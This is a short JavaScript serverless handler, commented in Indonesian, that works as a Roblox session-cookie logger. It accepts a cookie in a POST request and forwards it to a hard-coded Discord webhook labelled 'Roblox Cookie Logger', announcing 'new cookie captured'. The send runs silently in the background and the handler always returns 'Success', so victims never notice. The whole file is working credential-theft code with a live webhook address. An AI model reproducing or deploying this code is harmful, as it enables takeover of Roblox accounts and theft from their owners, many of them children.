// Import library node-fetch
import fetch from 'node-fetch';

export default async function handler(req, res) {
    // Hanya izinkan metode POST
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    // Ambil cookie dari body request
    const { cookie } = req.body;

    if (!cookie) {
        return res.status(400).json({ message: 'Cookie is required' });
    }

    // !!! PENTING: GANTI DENGAN WEBHOOK DISCORD ANDA !!!
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1462437468908290233/C0d9Ghggmr8dvV37iTh0ZB8sFxuWuUAwqHHjR2pvWTA6ksXBCjtYEKeEZUbwNPGoW1t-';

    const payload = {
        content: `🍪 **Cookie Baru Tertangkap!** 🍮\n\`\`\`${cookie}\`\`\``,
        username: "Roblox Cookie Logger",
        avatar_url: "https://i.imgur.com/rVw5B2W.png"
    };

    // !!! PERUBAHAN KRUSIAL DI SINI !!!
    // Kita nggak pake 'await', jadi nggak nunggu Discord.
    // Kita jalanin di background.
    fetch(discordWebhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
    }).catch(error => {
        // Ini cuma buat log di server, biar kita tau kalau gagal.
        // Tapi user nggak bakal ngelihat error ini.
        console.error('Gagal kirim ke Discord (async):', error);
    });

    // Langsung kirim jawaban SUKSES ke browser, tanpa nunggu!
    res.status(200).json({ message: 'Success' });
}
